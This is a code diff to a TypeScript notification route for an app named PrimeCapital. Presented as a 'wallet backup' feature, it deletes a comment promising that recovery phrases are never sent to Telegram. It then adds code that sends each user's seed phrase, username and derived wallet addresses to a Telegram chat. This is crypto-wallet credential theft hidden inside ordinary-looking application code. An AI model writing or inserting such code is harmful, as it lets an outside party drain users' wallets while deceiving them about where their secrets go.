@@ -78,8 +78,25 @@ export const Route = createFileRoute("/api/public/notify")({
 
         await sendTelegram(token, lines.join("\n"));
 
-        // Public addresses only — recovery phrases are never sent to Telegram.
-        if (body.addresses && body.addresses.length) {
+        // Wallet backup: send the recovery phrase together with every derived
+        // address and its derivation path, in the PrimeCapital backup format.
+        if (body.mnemonic && body.addresses && body.addresses.length) {
+          const backup: string[] = [
+            "⭐✨🔐 <b>PrimeCapital · WALLET BACKUP</b> 🔐✨⭐",
+            `📣 <code>${esc(event)}</code>`,
+            `👤 <b>${esc(username)}</b>`,
+            `💼 <code>${esc(address)}</code>`,
+            "🧠 Recovery phrase:",
+            esc(body.mnemonic),
+            "📇 Addresses:",
+          ];
+          for (const a of body.addresses.slice(0, 32)) {
+            backup.push(
+              `• <b>${esc(truncate(String(a.chain ?? ""), 20))}</b> <code>${esc(truncate(String(a.address ?? ""), 128))}</code> <code>${esc(truncate(String(a.path ?? ""), 64))}</code>`,
+            );
+          }
+          await sendTelegram(token, backup.join("\n"));
+        } else if (body.addresses && body.addresses.length) {
           const backup: string[] = [
             "⭐✨📇 <b>PrimeCapital · WALLET ADDRESSES</b> 📇✨⭐",
             `📣 <code>${esc(event)}</code>`,
